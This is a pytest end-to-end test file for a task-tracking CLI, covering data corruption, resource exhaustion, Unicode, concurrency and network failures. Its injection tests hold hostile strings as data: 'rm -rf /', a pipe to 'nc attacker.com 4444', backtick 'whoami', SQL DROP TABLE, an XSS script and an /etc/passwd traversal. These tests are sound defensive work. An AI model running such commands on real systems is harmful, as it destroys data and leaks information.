"""End-to-end tests for edge cases, error recovery, and resilience."""

import json
import os
import random
import shutil
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from unittest.mock import Mock, patch

import pytest
import yaml
from typer.testing import CliRunner

from ai_trackdown_pytools.cli import app
from ai_trackdown_pytools.core.task import TaskManager


@pytest.fixture
def edge_case_environment():
    """Create test environment for edge case testing."""
    temp_dir = tempfile.mkdtemp()
    project_path = Path(temp_dir) / "edge_case_project"
    project_path.mkdir()

    runner = CliRunner()

    # Initialize project
    with patch("os.getcwd", return_value=str(project_path)):
        result = runner.invoke(
            app, ["init", "project", "--name", "Edge Case Test Project"]
        )
        assert result.exit_code == 0

    yield {"runner": runner, "project_path": project_path, "temp_dir": temp_dir}

    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)


class TestDataCorruptionAndRecovery:
    """Test handling of corrupted data and recovery mechanisms."""

    def test_corrupted_task_file_recovery(self, edge_case_environment):
        """Test recovery from corrupted task files."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create valid task
            result = runner.invoke(
                app,
                [
                    "task",
                    "create",
                    "Valid task for corruption test",
                    "--priority",
                    "high",
                ],
            )
            assert result.exit_code == 0
            task_id = self._extract_task_id(result.stdout)

            # Find task file
            task_file = None
            for status_dir in ["open", "in_progress", "completed"]:
                potential_file = project_path / "tasks" / status_dir / f"{task_id}.md"
                if potential_file.exists():
                    task_file = potential_file
                    break

            assert task_file is not None

            # Corrupt the file in various ways
            corruption_scenarios = [
                # Invalid YAML frontmatter
                """---
title: Corrupted Task
status: open
invalid_yaml: [unclosed
---
# Task content""",
                # Missing required fields
                """---
# Missing title and other required fields
description: Some description
---
# Task content""",
                # Binary data corruption
                b"\x00\x01\x02\x03Invalid binary data mixed with text",
                # Truncated file
                """---
title: Truncated Task
status: ope""",
                # Invalid encoding
                """---
title: Invalid Encoding Task
status: open
description: \udcff\udcfe Invalid UTF-8 sequences
---
# Content""",
            ]

            for corruption in corruption_scenarios:
                # Backup original
                original_content = task_file.read_bytes()

                try:
                    # Apply corruption
                    if isinstance(corruption, bytes):
                        task_file.write_bytes(corruption)
                    else:
                        task_file.write_text(corruption)

                    # Try to read corrupted task
                    result = runner.invoke(app, ["task", "show", task_id])
                    # Should handle gracefully
                    assert result.exit_code in [0, 1]

                    # Try to validate
                    result = runner.invoke(app, ["validate", "tasks"])
                    assert result.exit_code in [0, 1]

                    # Try recovery
                    result = runner.invoke(
                        app, ["repair", "task", task_id, "--strategy", "best-effort"]
                    )
                    # Recovery attempt should not crash
                    assert result.exit_code in [0, 1]

                finally:
                    # Restore original
                    task_file.write_bytes(original_content)

    def test_database_corruption_recovery(self, edge_case_environment):
        """Test recovery from database/index corruption."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create tasks
            for i in range(10):
                runner.invoke(app, ["task", "create", f"Task {i+1}"])

            # Corrupt index file
            index_file = project_path / ".ai-trackdown" / "index.db"
            if index_file.exists():
                # Backup
                backup = index_file.read_bytes()

                try:
                    # Corrupt with random data
                    index_file.write_bytes(b"CORRUPTED" + os.urandom(100))

                    # Operations should still work (fallback to file scanning)
                    result = runner.invoke(app, ["task", "list"])
                    assert result.exit_code in [0, 1]

                    # Rebuild index
                    result = runner.invoke(app, ["maintenance", "rebuild-index"])
                    assert result.exit_code == 0

                finally:
                    # Restore
                    if backup:
                        index_file.write_bytes(backup)

    def test_concurrent_file_access_corruption(self, edge_case_environment):
        """Test handling of concurrent file access issues."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create base task
            result = runner.invoke(app, ["task", "create", "Concurrent access test"])
            task_id = self._extract_task_id(result.stdout)

            # Simulate concurrent modifications
            def modify_task(modification_type, value):
                """Simulate concurrent task modification."""
                try:
                    if modification_type == "status":
                        runner.invoke(
                            app, ["task", "update", task_id, "--status", value]
                        )
                    elif modification_type == "priority":
                        runner.invoke(
                            app, ["task", "update", task_id, "--priority", value]
                        )
                    elif modification_type == "tag":
                        runner.invoke(
                            app, ["task", "update", task_id, "--add-tag", value]
                        )
                except Exception:
                    pass  # Expected in concurrent scenarios

            # Run concurrent modifications
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []

                # Submit various modifications
                modifications = [
                    ("status", "in_progress"),
                    ("priority", "critical"),
                    ("tag", "concurrent1"),
                    ("tag", "concurrent2"),
                    ("status", "blocked"),
                ]

                for mod_type, value in modifications:
                    future = executor.submit(modify_task, mod_type, value)
                    futures.append(future)

                # Wait for completion
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass  # Some operations may fail due to conflicts

            # Verify task is still readable and valid
            result = runner.invoke(app, ["task", "show", task_id])
            assert result.exit_code == 0

            # Validate integrity
            result = runner.invoke(app, ["validate", "tasks"])
            assert result.exit_code in [0, 1]

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestResourceExhaustionScenarios:
    """Test behavior under resource exhaustion conditions."""

    def test_disk_space_exhaustion(self, edge_case_environment):
        """Test handling when disk space is exhausted."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create tasks until we simulate disk full
            created_tasks = []

            # Mock disk full after certain number of tasks
            original_write = Path.write_text
            write_count = 0
            max_writes = 5

            def mock_write_text(self, *args, **kwargs):
                nonlocal write_count
                write_count += 1
                if write_count > max_writes:
                    raise OSError(28, "No space left on device")
                return original_write(self, *args, **kwargs)

            with patch.object(Path, "write_text", mock_write_text):
                for i in range(10):
                    result = runner.invoke(
                        app, ["task", "create", f"Task {i+1} - testing disk space"]
                    )

                    if result.exit_code == 0:
                        created_tasks.append(self._extract_task_id(result.stdout))
                    else:
                        # Should handle disk full gracefully
                        assert (
                            "space" in result.stdout.lower()
                            or "disk" in result.stdout.lower()
                        )
                        break

            # Verify existing tasks are still accessible
            if created_tasks:
                result = runner.invoke(app, ["task", "show", created_tasks[0]])
                assert result.exit_code == 0

    def test_memory_exhaustion_handling(self, edge_case_environment):
        """Test handling of memory exhaustion scenarios."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create task with extremely large content
            large_content = "X" * (10 * 1024 * 1024)  # 10MB of content

            # Should handle large content gracefully
            result = runner.invoke(
                app,
                ["task", "create", "Memory test task"],
                input=f"Memory test task\n{large_content}\n",
            )

            # Should either succeed with truncation or fail gracefully
            assert result.exit_code in [0, 1]

            if result.exit_code == 1:
                assert (
                    "memory" in result.stdout.lower()
                    or "large" in result.stdout.lower()
                )

    def test_file_handle_exhaustion(self, edge_case_environment):
        """Test handling when file handles are exhausted."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create many tasks rapidly
            created_tasks = []

            # Mock file handle exhaustion
            original_open = open
            open_count = 0
            max_opens = 20

            def mock_open(*args, **kwargs):
                nonlocal open_count
                open_count += 1
                if open_count > max_opens:
                    raise OSError(24, "Too many open files")
                return original_open(*args, **kwargs)

            with patch("builtins.open", mock_open):
                for i in range(30):
                    result = runner.invoke(
                        app, ["task", "create", f"File handle test {i+1}"]
                    )

                    if result.exit_code == 0:
                        created_tasks.append(self._extract_task_id(result.stdout))
                    else:
                        # Should handle file handle exhaustion gracefully
                        assert (
                            "file" in result.stdout.lower()
                            or "open" in result.stdout.lower()
                        )

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestUnicodeAndEncodingEdgeCases:
    """Test handling of various Unicode and encoding edge cases."""

    def test_unicode_edge_cases(self, edge_case_environment):
        """Test handling of various Unicode characters and edge cases."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test various Unicode scenarios
            unicode_tests = [
                # Basic multilingual plane
                ("Task with émojis 🎯🔥💻🚀", "Unicode emoji test"),
                # Various scripts
                ("测试中文任务", "Chinese characters"),
                ("テスト日本語タスク", "Japanese characters"),
                ("Тестовая задача", "Cyrillic characters"),
                ("משימת בדיקה", "Hebrew (RTL) characters"),
                ("مهمة اختبار", "Arabic (RTL) characters"),
                # Special Unicode categories
                (
                    "Task\u200b\u200bwith\u200bzero\u200bwidth\u200bspaces",
                    "Zero-width spaces",
                ),
                (
                    "Task\u0301\u0308\u0327combining\u0301marks",
                    "Combining diacritical marks",
                ),
                # Edge cases
                ("Task\ufeffwith BOM", "Byte order mark"),
                ("Task\u2028with\u2029line\u2028separators", "Unicode line separators"),
                # Surrogate pairs (emoji with skin tone)
                ("Task with emoji variations 👨‍💻👩🏽‍💻👨🏿‍💻", "Emoji with modifiers"),
                # Very long Unicode
                ("任务" * 100, "Long Unicode string"),
            ]

            created_tasks = []
            for title, description in unicode_tests:
                result = runner.invoke(
                    app,
                    [
                        "task",
                        "create",
                        title,
                        "--description",
                        description,
                        "--tag",
                        "unicode-test",
                    ],
                )

                # Should handle all Unicode properly
                assert result.exit_code == 0
                created_tasks.append(self._extract_task_id(result.stdout))

            # Verify all tasks are searchable
            for task_id in created_tasks:
                result = runner.invoke(app, ["task", "show", task_id])
                assert result.exit_code == 0

            # Search with Unicode
            result = runner.invoke(app, ["search", "émojis"])
            assert result.exit_code == 0

            result = runner.invoke(app, ["search", "中文"])
            assert result.exit_code == 0

    def test_filename_encoding_edge_cases(self, edge_case_environment):
        """Test handling of edge cases in filenames."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test problematic filename characters
            filename_tests = [
                "Task/with/slashes",
                "Task\\with\\backslashes",
                "Task:with:colons",
                "Task|with|pipes",
                "Task<with>brackets",
                'Task"with"quotes',
                "Task?with?questions",
                "Task*with*asterisks",
                "Task\twith\ttabs",
                "Task\nwith\nnewlines",
                "Task with    spaces",
                "Task.with.dots...",
                "CON",  # Windows reserved name
                "PRN",  # Windows reserved name
                "AUX",  # Windows reserved name
                ".hiddenTask",
                "Task" + "." * 50,  # Many dots
            ]

            for title in filename_tests:
                result = runner.invoke(
                    app, ["task", "create", title, "--tag", "filename-test"]
                )

                # Should handle all filenames safely
                assert result.exit_code == 0

                # Verify task is readable
                task_id = self._extract_task_id(result.stdout)
                result = runner.invoke(app, ["task", "show", task_id])
                assert result.exit_code == 0

    def test_mixed_encoding_scenarios(self, edge_case_environment):
        """Test handling of mixed encoding scenarios."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create task with UTF-8
            result = runner.invoke(
                app, ["task", "create", "UTF-8 Task: café résumé naïve"]
            )
            assert result.exit_code == 0
            task_id = self._extract_task_id(result.stdout)

            # Try to corrupt encoding by direct file manipulation
            task_file = None
            for status_dir in ["open", "in_progress", "completed"]:
                potential_file = project_path / "tasks" / status_dir / f"{task_id}.md"
                if potential_file.exists():
                    task_file = potential_file
                    break

            if task_file:
                # Read as UTF-8
                content = task_file.read_text(encoding="utf-8")

                # Write with different encoding
                try:
                    task_file.write_text(content, encoding="latin-1")
                except UnicodeEncodeError:
                    # Some characters might not be encodable in latin-1
                    pass

                # CLI should handle encoding detection/conversion
                result = runner.invoke(app, ["task", "show", task_id])
                assert result.exit_code in [0, 1]

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestSystemInterruptionAndRecovery:
    """Test handling of system interruptions and recovery."""

    def test_operation_interruption_recovery(self, edge_case_environment):
        """Test recovery from interrupted operations."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Simulate interrupted batch operation
            batch_size = 10

            # Mock interruption after partial completion
            created_count = 0
            interrupt_at = 5

            original_create = TaskManager.create_task

            def mock_create_task(self, *args, **kwargs):
                nonlocal created_count
                created_count += 1
                if created_count == interrupt_at:
                    raise KeyboardInterrupt("Simulated interruption")
                return original_create(self, *args, **kwargs)

            with patch.object(TaskManager, "create_task", mock_create_task):
                # Run batch creation that will be interrupted
                result = runner.invoke(
                    app,
                    [
                        "batch",
                        "create",
                        "tasks",
                        "--count",
                        str(batch_size),
                        "--prefix",
                        "Batch task",
                    ],
                )

                # Should handle interruption gracefully
                assert result.exit_code == 1
                assert (
                    "interrupt" in result.stdout.lower()
                    or created_count == interrupt_at - 1
                )

            # Verify partial work was preserved
            result = runner.invoke(app, ["task", "list"])
            assert result.exit_code == 0
            # Should have created some tasks before interruption

    def test_transaction_rollback_scenarios(self, edge_case_environment):
        """Test transaction rollback in various scenarios."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create epic with tasks in transaction
            result = runner.invoke(
                app,
                [
                    "epic",
                    "create",
                    "Transactional Epic",
                    "--with-tasks",
                    json.dumps(
                        [
                            {"title": "Task 1", "priority": "high"},
                            {"title": "Task 2", "priority": "medium"},
                            {
                                "title": "Invalid Task",
                                "priority": "invalid_priority",
                            },  # Will cause error
                            {"title": "Task 4", "priority": "low"},
                        ]
                    ),
                    "--atomic",  # All or nothing
                ],
            )

            # Should rollback entire operation due to invalid task
            assert result.exit_code == 1
            assert (
                "invalid_priority" in result.stdout
                or "rollback" in result.stdout.lower()
            )

            # Verify nothing was created
            result = runner.invoke(app, ["epic", "list"])
            assert result.exit_code == 0
            assert "Transactional Epic" not in result.stdout

    def test_cleanup_after_crash(self, edge_case_environment):
        """Test cleanup mechanisms after simulated crash."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create lock files and temp files to simulate crash
            lock_file = project_path / ".ai-trackdown" / "operation.lock"
            lock_file.parent.mkdir(exist_ok=True)
            lock_file.write_text(
                json.dumps(
                    {
                        "pid": 99999,  # Non-existent process
                        "operation": "bulk_update",
                        "started": datetime.now().isoformat(),
                    }
                )
            )

            # Create orphaned temp files
            temp_dir = project_path / ".ai-trackdown" / "tmp"
            temp_dir.mkdir(exist_ok=True)
            for i in range(5):
                temp_file = temp_dir / f"orphaned_{i}.tmp"
                temp_file.write_text(f"Orphaned temp data {i}")

            # Run cleanup
            result = runner.invoke(app, ["maintenance", "cleanup", "--force"])
            assert result.exit_code == 0

            # Verify cleanup
            assert not lock_file.exists() or "cleanup" in result.stdout.lower()
            assert not list(temp_dir.glob("orphaned_*.tmp"))

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestExtremeInputScenarios:
    """Test handling of extreme and unusual inputs."""

    def test_extremely_long_inputs(self, edge_case_environment):
        """Test handling of extremely long inputs."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test very long title
            long_title = "A" * 1000 + " very long title " + "B" * 1000
            result = runner.invoke(
                app, ["task", "create", long_title, "--priority", "medium"]
            )
            # Should either truncate or handle gracefully
            assert result.exit_code in [0, 1]

            if result.exit_code == 0:
                task_id = self._extract_task_id(result.stdout)
                result = runner.invoke(app, ["task", "show", task_id])
                assert result.exit_code == 0

            # Test very long description
            long_description = "Description " * 10000  # ~110KB
            result = runner.invoke(
                app,
                ["task", "create", "Task with long description"],
                input=f"Task with long description\n{long_description}\n",
            )
            assert result.exit_code in [0, 1]

            # Test many tags
            tags = [f"tag{i}" for i in range(100)]
            tag_args = []
            for tag in tags:
                tag_args.extend(["--tag", tag])

            result = runner.invoke(
                app, ["task", "create", "Task with many tags"] + tag_args
            )
            assert result.exit_code in [0, 1]

    def test_special_character_inputs(self, edge_case_environment):
        """Test handling of special characters in inputs."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test various special characters
            special_inputs = [
                "Task with NULL\x00character",
                "Task with\r\nCRLF",
                "Task with\rCR only",
                "Task with\x1b[31mANSI\x1b[0m codes",
                "Task with ${VARIABLE} expansion",
                "Task with `command` injection",
                "Task with $(command) substitution",
                "Task with <!-- comment --> HTML",
                "Task with <script>alert('xss')</script>",
                "Task with SQL'; DROP TABLE tasks; --",
                "Task with \\x00\\x01\\x02 hex",
                "Task with %00%01%02 URL encoding",
                "Task with ../../../etc/passwd path traversal",
                "Task with C:\\Windows\\System32 paths",
                "Task with \\\\server\\share UNC paths",
            ]

            for title in special_inputs:
                result = runner.invoke(
                    app, ["task", "create", title, "--tag", "special-char-test"]
                )

                # Should sanitize or handle safely
                assert result.exit_code in [0, 1]

                if result.exit_code == 0:
                    task_id = self._extract_task_id(result.stdout)
                    # Verify task is readable and safe
                    result = runner.invoke(app, ["task", "show", task_id])
                    assert result.exit_code == 0

    def test_resource_bomb_inputs(self, edge_case_environment):
        """Test handling of inputs designed to exhaust resources."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test zip bomb-like nested structure
            nested_data = {"level": 1}
            current = nested_data
            for i in range(100):
                current["next"] = {"level": i + 2}
                current = current["next"]

            result = runner.invoke(
                app,
                [
                    "task",
                    "create",
                    "Task with nested data",
                    "--metadata",
                    json.dumps(nested_data),
                ],
            )
            # Should handle deep nesting gracefully
            assert result.exit_code in [0, 1]

            # Test regex bomb (catastrophic backtracking)
            dangerous_patterns = [
                "(a+)+b",  # Exponential backtracking
                "(x+x+)+y",  # Nested quantifiers
                "(.*)*x",  # Greedy star
            ]

            for pattern in dangerous_patterns:
                # Search with dangerous pattern on large input
                result = runner.invoke(
                    app,
                    [
                        "search",
                        "--regex",
                        pattern,
                        "--timeout",
                        "1",  # 1 second timeout
                    ],
                )
                # Should timeout or handle safely
                assert result.exit_code in [0, 1, 2]

    def test_injection_attempts(self, edge_case_environment):
        """Test handling of various injection attempts."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test command injection attempts
            injection_attempts = [
                {
                    "title": "Task; rm -rf /",
                    "description": "Attempting command injection",
                    "tag": "security-test",
                },
                {
                    "title": "Task && echo 'injected'",
                    "description": "Command chaining attempt",
                    "tag": "security-test",
                },
                {
                    "title": "Task | nc attacker.com 4444",
                    "description": "Pipe injection attempt",
                    "tag": "security-test",
                },
                {
                    "title": "Task`whoami`",
                    "description": "Backtick injection",
                    "tag": "security-test",
                },
                {
                    "title": 'Task"; DROP TABLE tasks; --',
                    "description": "SQL injection attempt",
                    "tag": "security-test",
                },
            ]

            for attempt in injection_attempts:
                result = runner.invoke(
                    app,
                    [
                        "task",
                        "create",
                        attempt["title"],
                        "--description",
                        attempt["description"],
                        "--tag",
                        attempt["tag"],
                    ],
                )

                # Should create task safely without executing injected commands
                assert result.exit_code == 0

                # Verify no command was executed
                assert not Path("/tmp/injected").exists()

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestRaceConditionsAndConcurrency:
    """Test race conditions and concurrent access scenarios."""

    def test_concurrent_id_generation(self, edge_case_environment):
        """Test ID generation under high concurrency."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            created_ids = []
            lock = threading.Lock()

            def create_task(index):
                """Create task in thread."""
                result = runner.invoke(
                    app,
                    [
                        "task",
                        "create",
                        f"Concurrent task {index}",
                        "--priority",
                        random.choice(["low", "medium", "high"]),
                    ],
                )

                if result.exit_code == 0:
                    task_id = self._extract_task_id(result.stdout)
                    with lock:
                        created_ids.append(task_id)

            # Create tasks concurrently
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for i in range(50):
                    future = executor.submit(create_task, i)
                    futures.append(future)

                # Wait for all to complete
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass

            # Verify no ID collisions
            assert len(created_ids) == len(set(created_ids)), "ID collision detected!"

            # Verify all tasks are accessible
            for task_id in created_ids[:10]:  # Check first 10
                result = runner.invoke(app, ["task", "show", task_id])
                assert result.exit_code == 0

    def test_concurrent_status_transitions(self, edge_case_environment):
        """Test concurrent status transitions on same task."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create task
            result = runner.invoke(
                app, ["task", "create", "Status race condition test"]
            )
            task_id = self._extract_task_id(result.stdout)

            # Define conflicting status transitions
            transitions = [
                ("in_progress", "alice"),
                ("blocked", "bob"),
                ("in_progress", "charlie"),
                ("completed", "diana"),
                ("cancelled", "eve"),
            ]

            results = []

            def update_status(status, user):
                """Update task status."""
                with patch.dict(os.environ, {"USER": user}):
                    result = runner.invoke(
                        app, ["task", "update", task_id, "--status", status]
                    )
                    results.append((status, user, result.exit_code))

            # Execute concurrent updates
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for status, user in transitions:
                    future = executor.submit(update_status, status, user)
                    futures.append(future)

                for future in as_completed(futures):
                    future.result()

            # Task should be in one valid state
            result = runner.invoke(app, ["task", "show", task_id])
            assert result.exit_code == 0

            # Status should be one of the attempted values
            status_line = [
                line for line in result.stdout.split("\n") if "status" in line.lower()
            ]
            assert any(status[0] in str(status_line) for status in transitions)

    def test_file_locking_scenarios(self, edge_case_environment):
        """Test file locking and concurrent file access."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create task
            result = runner.invoke(app, ["task", "create", "File lock test"])
            task_id = self._extract_task_id(result.stdout)

            # Find task file
            task_file = None
            for status_dir in ["open", "in_progress", "completed"]:
                potential_file = project_path / "tasks" / status_dir / f"{task_id}.md"
                if potential_file.exists():
                    task_file = potential_file
                    break

            assert task_file is not None

            # Simulate file lock
            import fcntl

            # One thread holds exclusive lock
            def hold_lock():
                with open(task_file, "r+") as f:
                    fcntl.flock(f.fileno(), fcntl.LOCK_EX)
                    time.sleep(2)  # Hold lock for 2 seconds
                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)

            # Start lock holder
            lock_thread = threading.Thread(target=hold_lock)
            lock_thread.start()

            # Try to update while locked
            time.sleep(0.5)  # Let lock be acquired
            start_time = time.time()
            result = runner.invoke(
                app, ["task", "update", task_id, "--add-tag", "updated-while-locked"]
            )
            elapsed = time.time() - start_time

            # Should either wait for lock or handle gracefully
            assert result.exit_code in [0, 1]

            # Wait for lock to be released
            lock_thread.join()

            # Verify task is still valid
            result = runner.invoke(app, ["task", "show", task_id])
            assert result.exit_code == 0

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestBackwardCompatibility:
    """Test backward compatibility with older data formats."""

    def test_legacy_format_migration(self, edge_case_environment):
        """Test reading and migrating legacy format files."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create legacy format files
            legacy_formats = [
                # Version 1.0 format
                {
                    "filename": "TASK-001.md",
                    "content": """# TASK-001: Legacy Task Format v1

Status: Open
Priority: High
Assigned: john.doe

## Description
This is a task in the old v1 format.

## Notes
- Created manually
- Needs migration
""",
                },
                # Version 1.5 format with basic frontmatter
                {
                    "filename": "TASK-002.md",
                    "content": """---
status: in-progress
priority: medium
assignee: jane.doe
---

# TASK-002: Legacy Task Format v1.5

This format has basic frontmatter but missing required fields.
""",
                },
                # JSON sidecar format
                {
                    "filename": "TASK-003.md",
                    "content": "# TASK-003: Task with JSON sidecar\n\nTask content here.",
                    "sidecar": "TASK-003.json",
                    "sidecar_content": {
                        "id": "TASK-003",
                        "title": "Task with JSON sidecar",
                        "status": "open",
                        "priority": "low",
                        "metadata": {"created": "2023-01-01T00:00:00Z"},
                    },
                },
            ]

            # Create legacy files
            legacy_dir = project_path / "legacy_tasks"
            legacy_dir.mkdir()

            for legacy in legacy_formats:
                file_path = legacy_dir / legacy["filename"]
                file_path.write_text(legacy["content"])

                if "sidecar" in legacy:
                    sidecar_path = legacy_dir / legacy["sidecar"]
                    sidecar_path.write_text(json.dumps(legacy["sidecar_content"]))

            # Run migration
            result = runner.invoke(
                app,
                [
                    "migrate",
                    "legacy",
                    "--source",
                    str(legacy_dir),
                    "--format",
                    "auto-detect",
                    "--preserve-ids",
                ],
            )
            assert result.exit_code == 0

            # Verify migrated tasks
            result = runner.invoke(app, ["task", "list"])
            assert result.exit_code == 0
            assert "TASK-001" in result.stdout or "Legacy Task Format" in result.stdout

    def test_schema_version_compatibility(self, edge_case_environment):
        """Test compatibility across schema versions."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Create task with future schema version
            future_task = {
                "schema_version": "3.0",  # Future version
                "id": "TSK-FUTURE",
                "title": "Task from the future",
                "status": "quantum_superposition",  # Future status
                "priority": "ultra_critical",  # Future priority
                "quantum_entangled_with": ["TSK-001", "TSK-002"],  # Future field
                "ai_generated": True,
                "confidence_score": 0.95,
            }

            # Write future format task
            future_file = project_path / "tasks" / "open" / "TSK-FUTURE.md"
            future_file.parent.mkdir(parents=True, exist_ok=True)
            future_file.write_text(
                f"""---
{yaml.dump(future_task)}
---

# {future_task['title']}

This task uses features from a future version.
"""
            )

            # Current version should handle gracefully
            result = runner.invoke(app, ["task", "show", "TSK-FUTURE"])
            # Should either show with warnings or handle unknown fields
            assert result.exit_code in [0, 1]

            if result.exit_code == 0:
                assert (
                    "future" in result.stdout.lower() or "TSK-FUTURE" in result.stdout
                )

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


class TestNetworkAndExternalServiceFailures:
    """Test handling of network and external service failures."""

    def test_network_timeout_handling(self, edge_case_environment):
        """Test handling of network timeouts."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Mock slow network responses
            def slow_response(*args, **kwargs):
                time.sleep(10)  # Simulate slow network
                raise TimeoutError("Network request timed out")

            with patch("requests.get", side_effect=slow_response):
                # Try to sync with GitHub (should timeout)
                result = runner.invoke(
                    app,
                    ["sync", "import", "github", "--timeout", "2"],  # 2 second timeout
                )

                # Should handle timeout gracefully
                assert result.exit_code == 1
                assert "timeout" in result.stdout.lower()

    def test_api_rate_limiting(self, edge_case_environment):
        """Test handling of API rate limiting."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Mock rate limit response
            mock_response = Mock()
            mock_response.status_code = 429
            mock_response.headers = {
                "X-RateLimit-Limit": "60",
                "X-RateLimit-Remaining": "0",
                "X-RateLimit-Reset": str(int(time.time()) + 3600),
            }
            mock_response.json.return_value = {"message": "API rate limit exceeded"}

            with patch("requests.get", return_value=mock_response):
                result = runner.invoke(
                    app, ["sync", "import", "github", "--type", "issues"]
                )

                # Should handle rate limiting gracefully
                assert result.exit_code == 1
                assert "rate limit" in result.stdout.lower()

    def test_external_service_unavailable(self, edge_case_environment):
        """Test handling when external services are unavailable."""
        runner = edge_case_environment["runner"]
        project_path = edge_case_environment["project_path"]

        with patch("os.getcwd", return_value=str(project_path)):
            # Test various failure scenarios
            failure_scenarios = [
                (ConnectionError("Connection refused"), "connection"),
                (TimeoutError("Connection timed out"), "timeout"),
                (Exception("SSL: CERTIFICATE_VERIFY_FAILED"), "certificate"),
                (Exception("Name or service not known"), "dns"),
            ]

            for exception, expected_message in failure_scenarios:
                with patch("requests.post", side_effect=exception):
                    result = runner.invoke(
                        app,
                        [
                            "webhook",
                            "notify",
                            "--url",
                            "https://example.com/webhook",
                            "--event",
                            "task.created",
                        ],
                    )

                    # Should handle each failure type gracefully
                    assert result.exit_code == 1
                    assert (
                        expected_message in result.stdout.lower()
                        or "error" in result.stdout.lower()
                    )

    def _extract_task_id(self, output: str) -> str:
        """Extract task ID from CLI output."""
        import re

        match = re.search(r"(TSK-\d+)", output)
        if match:
            return match.group(1)
        return "TSK-001"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
